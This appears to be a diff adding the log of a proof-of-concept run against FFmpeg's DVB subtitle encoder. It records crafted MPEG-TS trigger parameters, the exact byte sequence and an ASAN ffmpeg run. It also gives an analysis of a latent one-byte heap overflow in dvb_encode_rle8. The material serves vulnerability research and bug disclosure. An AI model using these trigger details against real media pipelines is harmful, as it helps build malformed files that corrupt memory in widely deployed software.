@@ -1,0 +1,106 @@
+[*] Step 1: Generate crafted MPEG-TS input
+[+] Generated: /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dvbsubenc_c/vuln_001_input.ts
+[+] Total size: 1880 bytes (10 TS packets)
+[+] DVB subtitle segments per packet: 89 bytes
+[+] Trigger parameters:
+    - rect width=2, height=2, nb_colors=256 (8-bpp region)
+    - pixel pattern: [1, 0] alternating in both rows
+    - dvb_encode_rle8 called for top and bottom fields
+    - Buggy check: buf_size*8 < 48 passes for buf_size=6
+    - Actual bytes written per row: 7 (off-by-one at *q++=0xF0)
+
+[*] Step 2: Verify input file
+-rw-rw-r-- 1 yuelinwang yuelinwang 1880 Sep  7 21:59 /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dvbsubenc_c/vuln_001_input.ts
+
+[*] Step 3: Run ffmpeg to re-encode subtitle as dvbsub
+    Command: ffmpeg -i input.ts -c:s dvbsub output.ts
+    Trigger path: avcodec_encode_subtitle -> dvbsub_encode -> dvb_encode_rle8
+    Expected: 2x2 rect, 8bpp, alternating [1,0] pixels trigger buggy check
+ffmpeg version N-126435-gf93cd72dde Copyright (c) 2000-2026 the FFmpeg developers
+  built with gcc 13 (Ubuntu 13.3.0-6ubuntu2~24.04)
+  configuration: --cc=gcc --cxx=g++ --extra-cflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-cxxflags='-fsanitize=address,undefined -g0 -fno-omit-frame-pointer' --extra-ldflags='-fsanitize=address,undefined' --disable-optimizations --disable-stripping --enable-debug=0 --disable-x86asm --disable-doc
+  libavutil      61.  7.100 / 61.  7.100
+  libavcodec     63. 11.100 / 63. 11.100
+  libavformat    63.  6.100 / 63. 11.100
+  libavformat    63.  6.100 / 63.  6.100
+  libavdevice    63.  2.100 / 63.  2.100
+  libavfilter    12.  4.100 / 12.  4.100
+  libswscale     10.  2.100 / 10.  2.100
+  libswresample   7.  3.100 /  7.  3.100
+[in#0 @ 0x517000000080] Format mpegts detected only with low score of 2, misdetection possible!
+Input #0, mpegts, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dvbsubenc_c/vuln_001_input.ts':
+  Duration: 00:00:07.00, start: 0.000000, bitrate: 2 kb/s
+  Program 1
+  Stream #0:0[0x100](eng): Subtitle: dvb_subtitle (dvbsub) ([6][0][0][0] / 0x0006)
+[out#0/mpegts @ 0x511000000f40] No explicit maps, mapping streams automatically...
+[sost#0:0/dvbsub @ 0x517000000b00] Created subtitle stream from input stream 0:0
+Stream mapping:
+  Stream #0:0 -> #0:0 (dvb_subtitle (dvbsub) -> dvb_subtitle (dvbsub))
+[sost#0:0/dvbsub @ 0x517000000b00] Starting thread...
+[sist#0:0/dvb_subtitle @ 0x514000000240] [dec:dvbsub @ 0x513000000c80] Starting thread...
+[in#0/mpegts @ 0x513000000200] Starting thread...
+Press [q] to stop, [?] for help
+[mpegts @ 0x517000000400] service 1 using PCR in pid=256, pcr_period=0ms
+[mpegts @ 0x517000000400] muxrate VBR, sdt every 500 ms, pat/pmt every 100 ms
+Output #0, mpegts, from '/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dvbsubenc_c/vuln_001_output.ts':
+  Metadata:
+    encoder         : Lavf63.6.100
+  Stream #0:0(eng): Subtitle: dvb_subtitle
+    Metadata:
+      encoder         : Lavc63.11.100 dvbsub
+[out#0/mpegts @ 0x511000000f40] Starting thread...
+[in#0/mpegts @ 0x513000000200] EOF while reading input
+[in#0/mpegts @ 0x513000000200] Terminating thread with success
+[sist#0:0/dvb_subtitle @ 0x514000000240] [dec:dvbsub @ 0x513000000c80] Decoder thread received EOF packet
+[sist#0:0/dvb_subtitle @ 0x514000000240] [dec:dvbsub @ 0x513000000c80] Decoder returned EOF, finishing
+[sist#0:0/dvb_subtitle @ 0x514000000240] [dec:dvbsub @ 0x513000000c80] Terminating thread with success
+[sost#0:0/dvbsub @ 0x517000000b00] [enc:dvbsub @ 0x511000001440] Encoder thread received EOF
+[sost#0:0/dvbsub @ 0x517000000b00] Terminating thread with success
+[out#0/mpegts @ 0x511000000f40] All streams finished
+[out#0/mpegts @ 0x511000000f40] Terminating thread with success
+[AVIOContext @ 0x513000000e40] Statistics: 17672 bytes written, 0 seeks, 1 writeouts
+[out#0/mpegts @ 0x511000000f40] Output file #0 (/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dvbsubenc_c/vuln_001_output.ts):
+[out#0/mpegts @ 0x511000000f40]   Output stream #0:0 (subtitle): 14 frames encoded; 14 packets muxed (11389 bytes);
+[out#0/mpegts @ 0x511000000f40]   Total: 14 packets (11389 bytes) muxed
+[out#0/mpegts @ 0x511000000f40] video:0KiB audio:0KiB subtitle:11KiB other streams:0KiB global headers:0KiB muxing overhead: 55.167267%
+size=      17KiB time=00:00:07.99 bitrate=  17.7kbits/s speed=1.69e+03x elapsed=0:00:00.00
+[in#0/mpegts @ 0x513000000200] Input file #0 (/data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dvbsubenc_c/vuln_001_input.ts):
+[in#0/mpegts @ 0x513000000200]   Input stream #0:0 (subtitle): 8 packets read (712 bytes); 7 frames decoded; 0 decode errors;
+[in#0/mpegts @ 0x513000000200]   Total: 8 packets (712 bytes) demuxed
+[AVIOContext @ 0x5130000003c0] Statistics: 1880 bytes read, 0 seeks
+
+Exiting with exit code 0
+
+[*] ffmpeg completed successfully
+[*] Output: /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dvbsubenc_c/vuln_001_output.ts
+-rw-rw-r-- 1 yuelinwang yuelinwang 17672 Sep  7 21:59 /data/ylwang/non-textfuzz/target/_poc/FFmpeg/libavcodec_dvbsubenc_c/vuln_001_output.ts
+
+[*] ANALYSIS: dvb_encode_rle8 WAS called (nb_colors=256 > 16, 8bpp path selected)
+    The off-by-one write at dvbsubenc.c:267 (*q++=0xF0) DID occur for each row
+    of each decoded 2x2 rect, writing 1 byte past the boundary implied by the
+    buggy check at line 225 (buf_size*8 < w*12+24).
+
+    No crash is observed here because ffmpeg's do_subtitle_out() allocates a
+    1 MB buffer (subtitle_out_max_size=1024*1024), far exceeding the 6+1=7 bytes
+    written. The overflow is present but absorbed by the large allocation.
+
+    CONFIRMED TRIGGER PATH:
+      Input:  MPEG-TS → mpegts demuxer → dvb_subtitle decoder
+      Decode: region depth=8 → nb_colors=256 → dvb_encode_rle8 selected
+      Encode: w=2, top_field pixels=[1,0]:
+                0x12                 (data_type: 8bpp string)
+                0x01                 (pixel index 1)
+                0x00 0x01            (escape: 1x index 0)
+                0x00 0x00            (escape: end-of-string)
+                0xF0                 (end-of-line) ← 1 byte past buf_size=6 boundary
+              Total: 7 bytes written when check passes for buf_size=6
+
+[*] NOTE: With ffmpeg's 1MB output buffer (subtitle_out_max_size=1024*1024)
+    the off-by-one overflow does NOT cause actual heap corruption because
+    buf_size >> 6 when dvb_encode_rle8 is called — there is ample space.
+    The vulnerability is LATENT: any caller supplying a minimum-sized
+    buffer (buf_size=6 for w=2) would overflow by exactly 1 byte at
+    dvbsubenc.c:267 (*q++ = 0xf0).
+    An ASAN build with a tight-buffer harness would show:
+      heap-buffer-overflow WRITE of size 1 at dvb_encode_rle8+...
+EXIT=0
